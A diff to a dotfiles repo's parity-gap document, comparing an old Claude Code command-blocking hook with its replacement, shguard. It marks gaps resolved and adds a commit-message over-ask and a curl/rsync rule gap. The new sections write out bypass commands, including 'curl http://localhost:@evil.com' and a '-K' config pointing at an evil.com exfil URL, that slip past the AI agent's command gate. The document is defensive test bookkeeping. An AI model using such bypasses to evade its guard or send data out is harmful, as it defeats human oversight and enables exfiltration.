@@ -20,7 +20,7 @@ weakening, documented so it isn't mistaken for a bug later.
 | # | Area | Status | Tracking |
 |---|------|--------|----------|
 | 1 | Malformed-input fail-closed mode | regression (minor) | not filed — see below |
-| 2 | curl (localhost-only) / rsync (local-only) | gap (pending upstream) | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) |
+| 2 | curl (localhost-only) / rsync (local-only) | **mostly resolved** — rules live in `config.toml`; residual sub-gaps in #23 | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) fixed |
 | 3 | Pipe-to-interpreter beyond curl\|wget→sh | gap (permanent) | not expressible |
 | 4 | Heredoc-fed interpreters (`python <<EOF`) | gap (permanent) | not expressible |
 | 5 | ANSI-C `$'...'` raw-string check | gap (permanent) | not expressible |
@@ -37,9 +37,11 @@ weakening, documented so it isn't mistaken for a bug later.
 | 16 | dotfiles issue #44 (multi-line `STRICT_CB` bypass) | **closed** by shguard | n/a — confirmed via parity check |
 | 17 | `doas`/`su`/`pkexec` payload-shielding (shguard#36) | assessed — not a gap here | [shguard#36](https://github.com/tsukasaI/shguard/issues/36) fixed in v0.3.0 (ticket open — same multi-issue auto-close quirk as #31) |
 | 18 | Missing/dangling default config path silently drops all user rules | **resolved** for dangling symlinks; residual gap for a clean absent-file case | [shguard#39](https://github.com/tsukasaI/shguard/issues/39) fixed, v0.3.0 |
-| 19 | `except_targets` treats flag values as candidate targets — 55% over-ask on real local curl usage | gap (pending upstream) — **blocks curl/rsync rules** | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) |
-| 20 | Parser can't parse `2>&1`/for/while/until/function-defs/`$?`/subshells — falls back to blanket `ask`, rule engine never runs | **regression (severe)** | [shguard#75](https://github.com/tsukasaI/shguard/issues/75) |
+| 19 | `except_targets` treats flag values as candidate targets — 55% over-ask on real local curl usage | **resolved** — `value_flags` field | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) fixed |
+| 20 | Parser can't parse `2>&1`/for/while/until/function-defs/`$?`/subshells — falls back to blanket `ask`, rule engine never runs | **resolved** | [shguard#75](https://github.com/tsukasaI/shguard/issues/75) fixed |
 | 21 | `git grep` bare-command match doesn't cover git subcommand form | gap, partial config fix | fixed via `dotfiles-tool-policy-git-grep`; `git -C <dir> grep` still uncovered |
+| 22 | `git commit -m "$(...)"` (heredoc-style commit messages) now `ask`s instead of `allow`s | **regression (blocks full cutover)** — not fixable from `config.toml` | [shguard#146](https://github.com/tsukasaI/shguard/issues/146) |
+| 23 | curl userinfo-URL bypass (`localhost:` as userinfo, not port) + rsync bare-relative-path over-block | **regression (security) + friction**, not fixable from `config.toml` | [shguard#147](https://github.com/tsukasaI/shguard/issues/147) filed (userinfo bypass only; rsync sub-gap not filed) |
 
 ## 1. Malformed-input fail-closed mode
 
@@ -64,11 +66,29 @@ including localhost, ask).
 and the primitive works.** But writing the rules with it surfaced a new,
 more severe problem: see #19 below — `except_targets` treats flag values
 as candidate targets, causing a 55% over-ask rate on real local curl
-usage. That's now the actual blocker
+usage. That was the actual blocker
 ([shguard#48](https://github.com/tsukasaI/shguard/issues/48)), not #30.
-Until #48 lands, curl/rsync coverage stays on `block-dangerous.sh`,
-which is why full cutover (migration plan's implementation steps) is
-gated on this issue.
+
+**Mostly resolved.** shguard#48 landed upstream via a new `value_flags`
+field (declare which flags take a value; their value is excluded from
+the candidate-target set entirely). `config.toml` now carries
+`dotfiles-network-curl-remote` / `dotfiles-network-rsync-remote`,
+verified live to match `block-dangerous.sh`'s old behavior for the
+cases exercised in `tests/shguard-parity-check.sh`: localhost/127.0.0.1/
+`[::1]` curl targets allow (including with `-o`/`-X`/`-d`/`-H` and other
+value-taking flags), a mixed localhost+remote invocation denies, a
+subdomain-spoof (`localhost.evil.com`) denies, local-to-local rsync
+(with a `./`/`../`/`~`-prefixed path, including with `--exclude=`)
+allows, and remote rsync denies.
+
+**Not exact parity, though** — a fable review (2026-08-06) found two
+residual sub-gaps neither fixable from `config.toml` nor from a tighter
+`except_targets` list; see #23 below for both: a userinfo-URL bypass
+(`curl http://localhost:@evil.com` allows when it should deny — a real
+exfiltration vector, not just friction) and an rsync over-block on bare
+relative paths (`rsync -a src/ dst/` now denies where the old hook
+allowed it). Both are locked in as `KNOWN_DELTA` cases in
+`tests/shguard-parity-check.sh` rather than left silently uncovered.
 
 ## 3. Pipe-to-interpreter beyond curl\|wget→sh
 
@@ -393,7 +413,16 @@ machine where `setup.sh` hasn't run yet and no symlink exists) still
 silently falls back to built-in-only. Narrower than originally recorded,
 still real.
 
-## 19. `except_targets` treats flag values as candidate targets — blocks curl/rsync rules
+## 19. `except_targets` treats flag values as candidate targets — resolved via `value_flags`
+
+**Resolved.** shguard added an opt-in `value_flags` field: declare which
+flags take a value (`value_flags = ["o", "w", "m", ...]` for curl) and
+that value — separated or `--name=value` attached — is excluded from the
+candidate-target set entirely, never checked against `except_targets`.
+Verified live against `config.toml`'s final curl/rsync rules (see #2
+above and `tests/shguard-parity-check.sh`): the exact 6-of-11 over-ask
+cases originally measured now all `allow`. History of the defect, for
+context:
 
 Writing the curl-localhost-only / rsync-local-only rules (deferred since
 #2 above) surfaced a new, more severe problem than #30 (`except_targets`
@@ -421,7 +450,22 @@ on `block-dangerous.sh`'s existing logic until #48 lands; shipping
 either `[[ask]]` or `[[deny]]` on top of a 55% false-positive rate on
 routine local usage would be a regression, not a parity port.
 
-## 20. Parser construct-support gaps mask the entire rule engine — the largest gap found
+## 20. Parser construct-support gaps mask the entire rule engine — the largest gap found, now resolved
+
+**Resolved.** shguard#75 landed upstream ("feat(gate): model for/while/until,
+subshells, function defs, and other issue #75 constructs") and is
+verified live against the installed binary: `rm -rf /tmp/x 2>&1` and a
+`for`-loop wrapping `rm -rf` — both examples of the 84 real commands the
+old hook denied but shguard used to wave through as a dismissible `ask`
+— now correctly `deny` via the normal rule engine. Locked in as
+permanent regression cases in `tests/shguard-parity-check.sh`.
+
+**Note on the installed binary's version string**: `shguard --version`
+reports `0.3.0` even when built from a commit well past that tag (the
+fix for this and #48 both landed after the v0.3.0 release tag but
+before the flake-pinned commit) — don't trust the version string alone
+to judge whether a fix has landed; check the actual pinned commit
+against the issue's closing commit instead.
 
 Found via the shadow-log observation period (2026-07-20 to 2026-07-31,
 `claude-code/hooks/shguard-shadow.sh`, migration plan step 5): every real
@@ -482,3 +526,109 @@ the old hook's bare-word scan could). Residual gap: `git -C <dir> grep
 ...` still isn't caught — a non-flag token before the subcommand breaks
 shguard's positional `required_tokens` matching, a known shguard
 limitation, not expressible from the config side.
+
+## 22. `git commit -m "$(...)"` (heredoc-style commit messages) now asks instead of allows — blocks full cutover
+
+Found while writing the shguard-based replacement for
+`tests/hooks-regression.sh` (the full-cutover work), independent of
+every other gap catalogued in this doc so far. This repo's own
+`CLAUDE.md` mandates a heredoc-style `-m` for every commit
+(`git commit -m "$(cat <<'EOF' ... EOF)"`, so multi-line messages
+survive quoting safely) — a pattern used on effectively every commit
+made in this repo.
+
+Verified live: the built-in `git-commit-no-verify-short` rule
+(`required_flags = ["n|--no-verify"]`) tries to check whether
+`-n`/`--no-verify` is present in the command; when the `-m` argument
+contains an unresolved command substitution, it can't fully verify past
+that and falls back to a cautious `ask` — reason string: "command
+matches blocklist rule 'git-commit-no-verify-short', but a required
+flag/token could not be fully checked because an argument is an
+unresolved $VAR or command substitution". Minimal repro:
+
+```
+echo '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"$(echo hi)\""},"hook_event_name":"PreToolUse"}' | shguard
+# -> ask (a plain quoted -m "message" with no substitution allows fine)
+```
+
+**Not fixable from `config.toml`.** Tested adding an `[[allow]]` rule
+(`command = "git", required_tokens = ["commit"]`) — no effect. Unlike
+delta #14's command-position unresolvable-substitution case (which
+`[[allow]]` *can* downgrade, per the README's documented mechanism),
+this ask is tied to the `git-commit-no-verify-short` rule's own
+match-attempt, a different internal path shguard's `[[allow]]`
+precedence doesn't reach.
+
+Net effect if cutover proceeds as-is: every commit made via the
+mandated heredoc pattern gets one extra confirmation click. Not a
+security regression (more cautious, not less) — a real, daily-workflow
+friction cost across every commit, not an edge case. **This is why
+full cutover (the `settings.json` swap to `shguard-gate.sh`) is paused**
+pending an upstream fix. Filed as
+[shguard#146](https://github.com/tsukasaI/shguard/issues/146).
+
+## 23. curl userinfo-URL bypass + rsync bare-relative-path over-block
+
+Found by a fable code-review pass (2026-08-06) on the #2/#19 curl/rsync
+rules above, before they were committed — verified live, not just read.
+Two distinct sub-gaps in the same rules, neither fixable from
+`config.toml`:
+
+**Userinfo-URL bypass (security-relevant, not just friction).** The
+`except_targets` anchoring (`{ exact = "http://localhost" }`,
+`{ prefix = "http://localhost:" }`, `{ prefix = "http://localhost/" }`,
+same for 127.0.0.1/`[::1]`/https) is plain string prefix matching with
+no URL-authority parsing. curl treats `user:password@host` as
+userinfo, not a port, so a colon right after `localhost` is
+indistinguishable from a real `:port` to a prefix match:
+
+```
+curl http://localhost:@evil.com     old=deny  shguard=allow
+curl http://localhost:80@evil.com   old=deny  shguard=allow
+```
+
+Both connect to **evil.com**, not localhost — a real exfiltration
+vector `block-dangerous.sh`'s `LOCAL_URL_RE` regex closes (it requires
+`:[0-9]+` followed by a real boundary) but this port cannot express
+with prefix/exact target matching alone. Widening the anchors would
+either still miss this shape or start rejecting ordinary
+`localhost:3000` usage — not a config fix, a schema limitation (same
+class as delta #9's "no suffix/contains matcher" gap). Locked in as
+`KNOWN_DELTA` cases in `tests/shguard-parity-check.sh`
+(`curl http://localhost:@evil.com`, `curl http://localhost:80@evil.com`)
+so the hole stays visible rather than silently passing parity.
+
+**`-K`/`--config` deliberately excluded from `value_flags`, unlike the
+other 13 flags.** `curl -K file.cfg` reads additional directives —
+including `url = "..."` — from `file.cfg`, so the flag's value can
+itself carry a network target, unlike `-o`/`-X`/`-d`/`-H`/etc. (bodies,
+headers, local paths, auth strings — none of which point at a target).
+Declaring `K` in `value_flags` would have let `curl -K /tmp/x.cfg
+http://localhost:3000/` sail through even when `x.cfg` contains
+`url = "https://evil.com/exfil"`. Verified live: with `K` excluded,
+this now correctly denies — stricter than `block-dangerous.sh` ever
+was (the old hook had no `-K` coverage at all). Kept as a documented
+`KNOWN_DELTA` (`old=allow`, `shguard=deny`) rather than an unexpected
+parity failure, since it's a deliberate improvement, not a gap.
+
+**rsync bare-relative-path over-block (friction, not security).**
+`except_targets` for `dotfiles-network-rsync-remote` covers `/`, `./`,
+`../`, `~`, and `.` — but not a bare relative path with no prefix at
+all:
+
+```
+rsync -a ./src/ ./dst/   old=allow  shguard=allow   (already covered)
+rsync -a src/ dst/       old=allow  shguard=deny    (new over-block)
+```
+
+Both are equally local, but a bare `src/` matches none of the except
+entries. Not fixable by adding a bare-word exception — that would also
+re-admit `host:path` remote specs (rsync's own remote-path syntax has
+no prefix that distinguishes it from a plain relative path). Locked in
+as a `KNOWN_DELTA` case (`rsync -a src/ dst/`) in
+`tests/shguard-parity-check.sh`.
+
+Userinfo bypass filed as
+[shguard#147](https://github.com/tsukasaI/shguard/issues/147). The
+rsync bare-relative-path sub-gap is not filed — pure friction, low
+severity, revisit if/when this migration resumes.
